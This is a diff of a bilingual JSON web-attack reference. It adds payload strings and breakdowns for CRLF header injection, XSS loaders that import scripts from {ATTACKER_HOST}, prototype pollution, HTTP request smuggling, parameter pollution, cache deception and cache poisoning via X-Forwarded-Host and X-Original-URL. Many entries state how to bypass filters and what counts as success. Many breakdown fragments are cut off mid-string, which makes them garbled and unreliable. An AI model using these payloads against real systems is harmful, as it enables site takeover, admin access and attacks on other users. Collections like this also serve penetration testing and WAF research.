+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -1509,7 +2200,25 @@
           "description": {
             "zh": "绕过只监控 Location 头的规则：Refresh（元刷新）与 Content-Location 达成同等跳转效果而头名不同，协议相对 URL 再隐藏 scheme；成功判据：浏览器/客户端因注入头跳转到攻击域。",
             "en": "Bypasses rules monitoring only Location: Refresh (meta-refresh) and Content-Location achieve the same redirect under different header names, with protocol-relative URLs hiding the scheme; success criterion: the client is redirected to the attacker host via the injected header."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%0d%0aRefresh:0;url=https:",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%0d%0aContent-Location:h",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -1520,7 +2229,25 @@
           "description": {
             "zh": "绕过对 \"https://攻击域\" 完整 URL 特征的规则：协议相对形式、目标整体 percent-encode、路径编码与端口+片段拼接改变字面而跳转目标不变；成功判据：任一形态触发到攻击域的跳转（或同时注入 Cookie）。",
             "en": "Bypasses rules on the full \"https://attacker\" URL feature: protocol-relative forms, wholly percent-encoded targets, encoded paths and port+fragment splices change the literal while preserving the redirect destination; success criterion: any form triggers the redirect (and optional cookie injection)."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%0d%0aLocation://%0d%0aSet",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%0d%0aLocation:https://{",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -1866,7 +2593,25 @@
           "description": {
             "zh": "嵌套与平铺同名键在不同层取值不同。成功判据：执行层取到 admin 值。",
             "en": "Nested and flat same-name keys resolve differently per layer. Success: the execution layer reads the admin value."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "{\"user\":{\"id\":1,\"role\":\"admin\"},\"user\":\"guest\"}",
+              "explanation": {
+                "zh": "嵌套与平铺同名键",
+                "en": "Nested vs flat same key"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{\"data\":{\"id\":1},\"id\":2}",
+              "explanation": {
+                "zh": "嵌套 id 覆盖",
+                "en": "Nested id override"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -1877,7 +2622,25 @@
           "description": {
             "zh": "数组形态使各层取首/尾元素不一致。成功判据：越权值被采信。",
             "en": "Array forms make layers disagree on first/last elements. Success: the unauthorized value is honored."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "{\"id\":[1,2]}",
+              "explanation": {
+                "zh": "数组双元素 id",
+                "en": "Array two-element id"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{\"user\":[\"admin\",\"guest\"],\"role\":[\"user\",\"admin\"]}",
+              "explanation": {
+                "zh": "数组身份与角色",
+                "en": "Array identity and role"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -1888,7 +2651,25 @@
           "description": {
             "zh": "转义键与明文键解析后同名的时序差异实现覆盖。成功判据：后键覆盖生效。",
             "en": "Escaped and plaintext keys collide after parsing, enabling overrides. Success: the later key wins."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "{\"\\u0072ole\":\"user\",\"role\":\"admin\"}",
+              "explanation": {
+                "zh": "转义键同名覆盖",
+                "en": "Escaped-key override"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{\"\\u0069d\":1,\"id\":2}",
+              "explanation": {
+                "zh": "转义 id 键覆盖",
+                "en": "Escaped id override"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -2011,7 +2792,25 @@
           "description": {
             "zh": "双重编码分隔符在第二层解码时重新拆分。成功判据：后端取到双参数。",
             "en": "Double-encoded separators re-split at the second decode layer. Success: the backend receives both parameters."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "param=1%2526param=2",
+              "explanation": {
+                "zh": "双重编码 &",
+                "en": "Double-encoded ampersand"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "param=1%253bparam=2",
+              "explanation": {
+                "zh": "双重编码分号",
+                "en": "Double-encoded semicolon"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -2022,7 +2821,25 @@
           "description": {
             "zh": "tab/CR LF/等号混合命中多种合并策略。成功判据：任一形态产生污染值。",
             "en": "Tab/CRLF/equals mixes hit various merging strategies. Success: any form yields a polluted value."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "param=1%09param=2&x=1",
+              "explanation": {
+                "zh": "tab 分隔加参数",
+                "en": "Tab separator plus param"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "param=1%3dparam%3d2&y=2",
+              "explanation": {
+                "zh": "等号混合分隔形态",
+                "en": "Equals-mixed separator"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -2033,7 +2850,25 @@
           "description": {
             "zh": "数组后缀形态触发框架特定的合并语义。成功判据：框架取到攻击者元素。",
             "en": "Array suffixes trigger framework-specific merge semantics. Success: the framework picks the attacker element."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "param[]=1&param[]=2",
+              "explanation": {
+                "zh": "数组同名参数",
+                "en": "Array-typed params"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "param=1&param[]=2",
+              "explanation": {
+                "zh": "标量数组混合",
+                "en": "Scalar-array mix"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -2544,7 +3379,8 @@
           "description": {
             "zh": "使用合法本地模块记录模块加载请求、CSP 决策和脚本调用栈，并保存原始请求、响应与服务端关联标识。",
             "en": "Use a legitimate local module to record module requests, CSP decisions, and script call stacks, retaining raw requests, responses, and server correlation identifiers."
-          }
+          },
+          "payload": "<img src=x onError=import('//{ATTACKER_HOST}/')>\n<img src=x onError=import('//{ATTACKER_HOST}/xss.js')>\n<img src=x onError=import('/xss.js')>\n<script>import('//{ATTACKER_HOST}/')</script>\n<script>import('//{ATTACKER_HOST}/xss.js')</script>\n<script>import('/xss.js')</script>\n<script type=module>import('//{ATTACKER_HOST}/')</script>\n<script type=module>import('//{ATTACKER_HOST}/xss.js')</script>\n<script type=module>import('/xss.js')</script>"
         },
         {
           "title": {
@@ -2653,7 +3489,8 @@
           "description": {
             "zh": "在干净页面记录相关配置对象的自有属性、原型链和正常资源请求，并保存原始请求、响应与服务端关联标识。",
             "en": "Record own properties, prototype chain, and normal resource requests for relevant configuration objects on a clean page, retaining raw requests, responses, and server correlation identifiers."
-          }
+          },
+          "payload": "<script>Object.prototype.BOOMR = 1;Object.prototype.url='//{ATTACKER_HOST}/xss.js'</script>\n<script>Object.prototype.BOOMR = 1;Object.prototype.url='//{ATTACKER_HOST}/'</script>\n<script>Object.prototype.BOOMR = 1;Object.prototype.url='/xss.js'</script>"
         },
         {
           "title": {
@@ -3236,7 +4073,17 @@
           "description": {
             "zh": "单头多值使前后端各取所需。判据：走私生效。",
             "en": "Multiple values in one header get parsed differently. Success: smuggle works."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "printf 'POST / HTTP/1.1\\r\\",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -3247,7 +4094,17 @@
           "description": {
             "zh": "头与值全大写绕过小写规则。判据：SMUGGLED 生效。",
             "en": "Everything uppercase. Success: SMUGGLED effective."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "printf 'POST / HTTP/1.1\\r\\",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -3258,7 +4115,17 @@
           "description": {
             "zh": "值前混合空白改变指纹。判据：走私成功。",
             "en": "Mixed whitespace before the value. Success: smuggle works."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "printf 'POST / HTTP/1.1\\r\\",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -3269,7 +4136,17 @@
           "description": {
             "zh": "首值拼接绕过整词匹配。判据：分歧行为暴露。",
             "en": "Concatenated first value dodges whole-word rules. Success: divergent behavior exposed."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "printf 'POST / HTTP/1.1\\r\\",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -3392,7 +4269,17 @@
           "description": {
             "zh": "h2 请求携带 CL 与 TE 头降级到 h1 时分帧分歧。判据：响应异常或走私生效。",
             "en": "Carrying both CL and TE over h2 splits framing on downgrade. Success: abnormal response or smuggle."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "nghttp -v 'https://{TARGET",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -3403,7 +4290,25 @@
           "description": {
             "zh": "h2c 升级绕过中间件（其只识别 h1）。判据：升级成功后直连后端。",
             "en": "h2c upgrade bypasses h1-only middleboxes. Success: direct backend channel after upgrade."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "curl -i 'http://{TARGET}'",
+              "explanation": {
+                "zh": "curl 发起请求",
+                "en": "curl request"
+              },
+              "type": "function"
+            },
+            {
+              "part": "http://{TARGET}'",
+              "explanation": {
+                "zh": "目标 URL",
+                "en": "Target URL"
+              },
+              "type": "url"
+            }
+          ]
         },
         {
           "title": {
@@ -3414,7 +4319,17 @@
           "description": {
             "zh": "h2 层双 CL 在降级代理处歧义。判据：后端按不同 CL 分帧。",
             "en": "Dual CL over h2 confuses downgrading proxies. Success: backend frames by a different CL."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "h2smuggler.py -t {TARGET} ",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -3425,7 +4340,17 @@
           "description": {
             "zh": ":method 等伪头部置于普通头之后触发宽容解析差异。判据：内网路径可达。",
             "en": "Pseudo-headers after regular headers trigger lenient parsing. Success: internal path reached."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "h2smuggler.py -t {TARGET} ",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -3548,7 +4473,17 @@
           "description": {
             "zh": "双 CL 差异把管理端请求走私给后端。判据：返回管理接口数据。",
             "en": "Dual-CL split smuggles an admin call. Success: admin API data returned."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "printf 'POST /api/v1/check",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -3559,7 +4494,17 @@
           "description": {
             "zh": "走私请求注入仅前端可信的内部头。判据：以 admin 身份获得响应。",
             "en": "Injects front-end-trusted internal headers via the smuggled request. Success: admin-authorized response."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "printf 'POST /api/v1/order",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -3570,7 +4515,17 @@
           "description": {
             "zh": "走私占位后下一个真实用户请求被误处理。判据：受害者请求返回异常内容。",
             "en": "Next victim request gets misattributed. Success: victim response contains abnormal content."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "printf 'POST /api/v1/cart ",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -3581,7 +4536,17 @@
           "description": {
             "zh": "升级请求附加分帧头把内部请求带入长连接。判据：metrics 数据到达。",
             "en": "Framing headers on an upgrade request smuggle into the long-lived connection. Success: metrics data arrives."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "printf 'GET /chat HTTP/1.1",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -3703,7 +4668,25 @@
           "description": {
             "zh": "绕过小写后缀精确匹配的缓存规则：大写扩展名仍按静态处理。成功判据：返回缓存的动态页面。",
             "en": "Bypasses cache rules matching lowercase suffixes exactly since uppercase extensions still classify as static. Success: the dynamic page returns from cache."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/home.php/.CSS",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/home.php/.Js",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -3714,7 +4697,25 @@
           "description": {
             "zh": "编码斜杠与点组合绕过路径分隔匹配。成功判据：命中静态缓存键返回动态内容。",
             "en": "Encoded slashes and dots bypass separator matching. Success: hits the static cache key and returns dynamic content."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/home.php%2F.css",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/home.php/.%63ss",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -3725,7 +4726,25 @@
           "description": {
             "zh": "多重后缀命中不同层各自认定的静态形态。成功判据：任一组合返回缓存动态页。",
             "en": "Stacked suffixes satisfy each layer's notion of static. Success: any combination returns the cached dynamic page."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/home.php/.css.js",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/home.php/.ico.png",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -4090,7 +5109,25 @@
           "description": {
             "zh": "绕过头名精确规范化前的特征：大小写变体仍进入派生逻辑。成功判据：响应引用攻击者主机。",
             "en": "Bypasses signatures applied before header-name normalization since case variants still reach derivation logic. Success: the response references the attacker host."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "x-forwarded-host: {ATTACKE",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Forwarded-Host: {ATTAC",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -4101,7 +5138,25 @@
           "description": {
             "zh": "轮换同义派生头命中未键入的取值字段。成功判据：任一头触发投毒响应。",
             "en": "Rotating synonymous derivation headers hits unkeyed extraction fields. Success: any header triggers the poisoned response."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Host: {ATTACKER_HOST}",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Forwarded-Server: {ATT",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -4112,7 +5167,25 @@
           "description": {
             "zh": "编码端口、显式端口与尾点变形绕过主机值白名单。成功判据：投毒值被采信。",
             "en": "Encoded port, explicit port, and trailing-dot mutations bypass host-value allowlists. Success: the poisoned value is honored."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Forwarded-Host: {ATTACKE",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Forwarded-Host: {ATTAC",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -4186,7 +5259,8 @@
           "description": {
             "zh": "使用唯一公开测试路径记录无头请求的源站路由、缓存键和响应哈希，并保存原始请求、响应与服务端关联标识。",
             "en": "Record origin route, cache key, and response hash for a unique public test path without the header, retaining raw requests, responses, and server correlation identifiers."
-          }
+          },
+          "payload": "X-Original-URL: /internal\nX-Original-URL: /api/config\nX-Original-URL: /debug\nX-Original-URL: /actuator/env\nX-Original-URL: /console\nX-Original-URL: /phpinfo.php\nX-Original-URL: /server-status\nX-Original-URL: /server-info\nX-Original-URL: /wp-admin\nX-Original-URL: /manager/html\nX-Original-URL: /jmx-console\nX-Original-URL: /web-console\nX-Original-URL: /invoker/JMXInvokerServlet"
         },
         {
           "title": {
@@ -4197,7 +5271,7 @@
             "zh": "逐项发送原始 X-Original-URL 值，仅指向测试环境的无害内部端点，再由干净客户端重取公开路径，严格保持其他变量不变并设置停止阈值。",
             "en": "Send original X-Original-URL values one at a time to harmless internal test endpoints, then re-request the public path from a clean client, holding all other variables constant and defining a stop threshold."
           },
-          "payload": "X-Original-URL: /internal\nX-Original-URL: /api/config\nX-Original-URL: /debug\nX-Original-URL: /actuator/env\nX-Original-URL: /console\nX-Original-URL: /phpinfo.php\nX-Original-URL: /server-status\nX-Original-URL: /server-info\nX-Original-URL: /wp-admin\nX-Original-URL: /manager/html\nX-Original-URL: /jmx-console\nX-Original-URL: /web-console\nX-Original-URL: /invoker/JMXInvokerServlet"
+          "payload": "X-Rewrite-URL: /internal"
         },
         {
           "title": {
@@ -4207,7 +5281,8 @@
           "description": {
             "zh": "确认内部端点内容在无该头的独立请求中以共享缓存 HIT 返回；同时排除仅当前请求内部路由、缓存 MISS、私有缓存或统一错误页。",
             "en": "Confirm that internal-endpoint content returns as a shared-cache hit to an independent request without the header; also exclude Internal routing only for the current request, cache misses, private caching, or generic error pages."
-          }
+          },
+          "payload": "X-Original-URL: /%69nternal\nX-Original-URL: /internal%2f\nX-Original-URL: //internal"
         }
       ],
       "references": [
@@ -4231,11 +5306,29 @@
             "zh": "双重写头叠加",
             "en": "Dual Rewrite Headers"
           },
-          "command": "X-Original-URL: /internal\nX-Rewrite-URL: /internal",
+          "command": "X-Rewrite-URL: /internal",
           "description": {
             "zh": "双覆盖头并存命中实现读取的任一字段。成功判据：缓存投毒内容返回给普通请求。",
             "en": "Both override headers coexist to hit whichever the implementation reads. Success: poisoned cache content serves to plain requests."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Original-URL: /internal",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Rewrite-URL: /internal",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -4246,7 +5339,25 @@
           "description": {
             "zh": "编码路径值绕过头值特征匹配且规范化等价。成功判据：内部路由命中并缓存。",
             "en": "Encoded path values bypass header-value signatures while normalizing equivalently. Success: the internal route is hit and cached."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Original-URL: /%69nterna",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Original-URL: /interna",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -4257,7 +5368,25 @@
           "description": {
             "zh": "尾缀变形使投毒请求与受害请求键不同规避检测。成功判据：投毒响应命中受害键。",
             "en": "Trailing mutations differ from victim keys to evade detection. Success: the poisoned response matches the victim key."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Original-URL: /internal?",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Original-URL: /interna",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -4331,7 +5460,8 @@
           "description": {
             "zh": "在无重写头时记录公开测试 URL 的后端处理器、缓存状态与正文指纹，并保存原始请求、响应与服务端关联标识。",
             "en": "Record backend handler, cache state, and body fingerprint for a public test URL without rewrite headers, retaining raw requests, responses, and server correlation identifiers."
-          }
+          },
+          "payload": "X-Rewrite-URL: /internal\nX-Rewrite-URL: /api/config\nX-Rewrite-URL: /debug\nX-Rewrite-URL: /actuator/env\nX-Rewrite-URL: /console\nX-Rewrite-URL: /phpinfo.php\nX-Rewrite-URL: /server-status"
         },
         {
           "title": {
@@ -4342,7 +5472,7 @@
             "zh": "逐项应用原始 X-Rewrite-URL 值到无害测试路由，并使用独立客户端检查公开 URL，严格保持其他变量不变并设置停止阈值。",
             "en": "Apply original X-Rewrite-URL values one at a time to harmless test routes and inspect the public URL from an independent client, holding all other variables constant and defining a stop threshold."
           },
-          "payload": "X-Rewrite-URL: /internal\nX-Rewrite-URL: /api/config\nX-Rewrite-URL: /debug\nX-Rewrite-URL: /actuator/env\nX-Rewrite-URL: /console\nX-Rewrite-URL: /phpinfo.php\nX-Rewrite-URL: /server-status"
+          "payload": "X-Rewrite-URL: /%61pi/config\nX-Rewrite-URL: /api%2Fconfig"
         },
         {
           "title": {
@@ -4352,7 +5482,8 @@
           "description": {
             "zh": "证明后端采用重写路由且其内容被边缘存入未包含该头的缓存键；同时排除代理删除头、源站返回同一公开内容或二次请求回源而非命中。",
             "en": "Prove that the backend adopts the rewrite route and the edge stores its content under a key excluding the header; also exclude Proxy stripping, identical public content from origin, or the second request returning to origin rather than hitting cache."
-          }
+          },
+          "payload": "X-Rewrite-URL: /debug/.\nX-Rewrite-URL: /debug//\nX-Rewrite-URL: /debug/..;/actuator"
         }
       ],
       "references": [
@@ -4380,7 +5511,25 @@
           "description": {
             "zh": "编码的路径段与斜杠绕过头值匹配。成功判据：重写路由命中目标。",
             "en": "Encoded segments and slashes bypass header-value matching. Success: the rewritten route hits the target."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Rewrite-URL: /%61pi/conf",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Rewrite-URL: /api%2Fco",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -4391,18 +5540,54 @@
           "description": {
             "zh": "尾部形态改变键但规范化后命中同一路由。成功判据：投毒内容缓存并返回。",
             "en": "Trailing shapes alter the key yet normalize onto the same route. Success: poisoned content is cached and returned."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Rewrite-URL: /debug/.",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Rewrite-URL: /debug//",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
             "zh": "双头组合投毒",
             "en": "Dual-Header Combo Poisoning"
           },
-          "command": "X-Rewrite-URL: /api/config\nX-Original-URL: /",
+          "command": "X-Original-URL: /",
           "description": {
             "zh": "重写头与原始头组合使缓存层与源站取不同路由。成功判据：缓存返回内部配置内容。",
             "en": "The rewrite and original headers make the cache and origin read different routes. Success: the cache serves internal config content."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Rewrite-URL: /api/config",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Original-URL: /",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -4529,7 +5714,25 @@
           "description": {
             "zh": "轮换协议派生头命中未键入字段。成功判据：响应以注入协议构造 URL。",
             "en": "Rotating protocol derivation headers hits unkeyed fields. Success: response URLs are built with the injected scheme."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Forwarded-Proto-Ssl: on",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "Front-End-Https: on",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -4540,7 +5743,25 @@
           "description": {
             "zh": "大小写与尾空格变形绕过协议值白名单。成功判据：投毒协议被采信。",
             "en": "Case and trailing-space mutations bypass scheme allowlists. Success: the poisoned scheme is honored."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Forwarded-Proto: HTTPS",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Forwarded-Scheme: Http",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -4551,7 +5772,25 @@
           "description": {
             "zh": "逗号/分号多值命中取首/取尾不同的解析层。成功判据：投毒响应产生。",
             "en": "Comma/semicolon multi-values hit layers that pick first vs last differently. Success: a poisoned response is produced."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Forwarded-Proto: https,h",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Forwarded-Proto: http;",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -4625,7 +5864,8 @@
           "description": {
             "zh": "记录无 Cache-Control 请求时的响应缓存策略、Age、ETag 和重新验证行为，并保存原始请求、响应与服务端关联标识。",
             "en": "Record response cache policy, Age, ETag, and revalidation behavior without a Cache-Control request header, retaining raw requests, responses, and server correlation identifiers."
-          }
+          },
+          "payload": "Cache-Control: no-store\nCache-Control: no-cache\nCache-Control: max-age=0\nCache-Control: max-age=999999\nCache-Control: public, max-age=999999\nCache-Control: s-maxage=999999\nCache-Control: public, s-maxage=999999, max-age=999999\nCache-Control: immutable\nCache-Control: public, immutable\nPragma: no-cache\nPragma: public\nExpires: Thu, 01 Jan 2099 00:00:00 GMT\nExpires: 0\nSurrogate-Control: max-age=999999\nCDN-Cache-Control: max-age=999999\nCloudflare-CDN-Cache-Control: max-age=999999"
         },
         {
           "title": {
@@ -4636,7 +5876,7 @@
             "zh": "逐项发送原始 Cache-Control 组合到测试资源，并在每次前使用唯一缓存键，严格保持其他变量不变并设置停止阈值。",
             "en": "Send original Cache-Control combinations one at a time to a test resource with a unique cache key for each run, holding all other variables constant and defining a stop threshold."
           },
-          "payload": "Cache-Control: no-store\nCache-Control: no-cache\nCache-Control: max-age=0\nCache-Control: max-age=999999\nCache-Control: public, max-age=999999\nCache-Control: s-maxage=999999\nCache-Control: public, s-maxage=999999, max-age=999999\nCache-Control: immutable\nCache-Control: public, immutable\nPragma: no-cache\nPragma: public\nExpires: Thu, 01 Jan 2099 00:00:00 GMT\nExpires: 0\nSurrogate-Control: max-age=999999\nCDN-Cache-Control: max-age=999999\nCloudflare-CDN-Cache-Control: max-age=999999"
+          "payload": "Cache-Control: no-cache, no-store, max-age=0"
         },
         {
           "title": {
@@ -4646,7 +5886,8 @@
           "description": {
             "zh": "确认请求指令改变共享缓存的存储、寿命或验证决策，并由第二客户端复现；同时排除响应头回显请求值、浏览器私有缓存变化或 Age 不代表共享内容。",
             "en": "Confirm that a request directive changes shared-cache storage, lifetime, or validation decisions and is reproduced by a second client; also exclude Response reflection of request values, private browser-cache changes, or Age unrelated to shared content."
-          }
+          },
+          "payload": "Cache-Control: no%2Dcache\nCache-Control: no-cache=1\nCache-Control: \"no-cache\""
         }
       ],
       "references": [
@@ -4669,7 +5910,7 @@
             "zh": "多指令叠加变形",
             "en": "Stacked Multi-Directive Mutation"
           },
-          "command": "Cache-Control: no-cache, no-store, max-age=0\nCache-Control: no-cache\r\nCache-Control: max-age=0",
+          "command": "Cache-Control: no-cache, no-store, max-age=0",
           "description": {
             "zh": "多指令与重复头叠加命中不同的解析归并策略。成功判据：响应缓存行为发生跳变。",
             "en": "Stacked directives and duplicate headers hit different merge strategies. Success: cache behavior jumps."
@@ -4684,17 +5925,6 @@
           "description": {
             "zh": "编码连字符、伪参数与引号包裹绕过指令白名单。成功判据：指令仍被解释为标准语义。",
             "en": "Encoded hyphens, pseudo-params, and quoting bypass directive allowlists. Success: the directive is still interpreted with standard semantics."
-          }
-        },
-        {
-          "title": {
-            "zh": "Pragma 兼容头替代",
-            "en": "Pragma Compatibility Alternative"
-          },
-          "command": "Pragma: no-cache\nPragma: no-cache\r\nCache-Control: max-age=0",
-          "description": {
-            "zh": "老协议头与标准头组合命中仅实现单一处理的缓存层。成功判据：绕过缓存资格判定。",
-            "en": "The legacy header combined with the standard one hits caches implementing only one. Success: cache eligibility checks are bypassed."
           }
         }
       ]
@@ -4930,7 +6160,25 @@
           "description": {
             "zh": "大小写与下划线变体命中边缘头规范化差异。成功判据：响应按伪造地理/会话逻辑变化。",
             "en": "Case and underscore variants hit edge-header normalization gaps. Success: responses change per the forged geo/session logic."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "x-akamai-edgescape: geoloc",
+              "explanation": {
